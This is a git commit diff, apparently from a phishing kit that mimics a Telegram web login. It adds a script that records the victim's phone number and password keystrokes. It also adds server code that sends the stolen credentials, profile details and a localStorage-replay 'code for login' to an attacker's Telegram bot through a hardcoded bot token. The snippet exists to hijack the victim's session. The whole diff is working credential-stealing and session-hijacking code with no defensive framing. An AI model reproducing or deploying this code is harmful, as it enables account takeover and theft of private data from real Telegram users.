bc4de13c0a7c014728fdfb1b2f816ac6d64b4061
Hotizana dealer <mtaymen@gmail.com>
2024-07-07 22:34:30 +0100

    final

---
+++ public/collect.js
@@ -0,0 +1,31 @@
+document.addEventListener('DOMContentLoaded', async () => {
+    const waitForElement = async (selector, condition) => {
+        return new Promise( async resolve => {
+            let intr = setInterval( () => {
+                const ele = document.querySelector( selector )
+                if( ele ) {
+                    if( condition(ele) ) {
+                        clearInterval(intr)
+                        resolve(ele)
+                    }
+                }
+            }, 50 )
+
+        } )
+    }
+
+    const waitForPhone = async () => {
+        const phoneInput = await waitForElement('.page-authCode .phone-wrapper h4.phone', ele => ele.innerText.trim() !== '')
+        window.detectedPhone = phoneInput.innerText.trim()
+    }
+    const waitForPass = async () => {
+        const passInput = await waitForElement('input[name="notsearch_password"]', () => true)
+
+        passInput.addEventListener('input', e => {
+            console.log(e.target.value)
+            window.detectedPass = e.target.value
+        })
+    }
+    waitForPhone()
+    waitForPass()
+})
--- server.js
+++ server.js
@@ -1,9 +1,27 @@
+const TelegramBot = require('node-telegram-bot-api')
 const express = require('express')
 const cors = require('cors')
 const app = express()
 const path = require('path')
 const bodyParser = require('body-parser')
 const axios = require('axios')
+
+const token = '7162361678:AAFYurkXq1LDEQK9_BWYjLZVe3odRhhcCg4'
+const chatId = 5641960649
+
+const bot = new TelegramBot(token, { polling: true })
+
+const getUserData = async (userId) => {
+    try {
+        const user = await bot.getChat(userId)
+        console.log(user)
+        return user
+    } catch (error) {
+        return null
+    }
+}
+  
+getUserData('6169753518')
 
 app.use(bodyParser.text())
 app.use(express.json())
@@ -15,17 +33,32 @@ app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'index.html'))
 })
 
-app.post('/verify', (req, res) => {
+app.post('/verify', async (req, res) => {
     const decodedData = atob(req.body)
     const jsonData = JSON.parse(decodedData)
 
-    const token = '7162361678:AAFYurkXq1LDEQK9_BWYjLZVe3odRhhcCg4'
-    const chatId = 5641960649
-    const text = decodedData
+    const userAuth = JSON.parse(jsonData.ls.user_auth)
+    const userId = userAuth.id
+    const userData = await getUserData(userId)
+    if( userData ) {
+        console.log('userData')
+    }
+
+    const textMessage = [
+        `NEW HIT JUST ARRIVED 🔻\n`,
+
+        ...(userData?[`Name: ${userData.first_name} ${userData.last_name}`]:[]),
+        ...(userData?[`Username: ${userData.username}`]:[]),
+        ...(jsonData.phone?[`Phone: ${jsonData.phone}`]:[]),
+        ...(jsonData.pass?[`Password: ${jsonData.pass}\n`]:[]),
+
+        `CODE FOR LOGIN:\n`,
+        `localStorage.clear();const data='${JSON.stringify(jsonData.ls)}',newData=JSON.parse(data.replaceAll(atob("ImNobmdfdGltZSI="),(new Date).getTime().toString()));Object.keys(newData).forEach((a=>{"object"==typeof newData[a]?localStorage.setItem(a,JSON.stringify(newData[a])):localStorage.setItem(a,newData[a])})),location.reload();`
+    ].join('\n')
 
     axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
         chat_id: chatId,
-        text: text
+        text: textMessage
     })
     .then(response => {
         console.log('Message sent:', response.data)
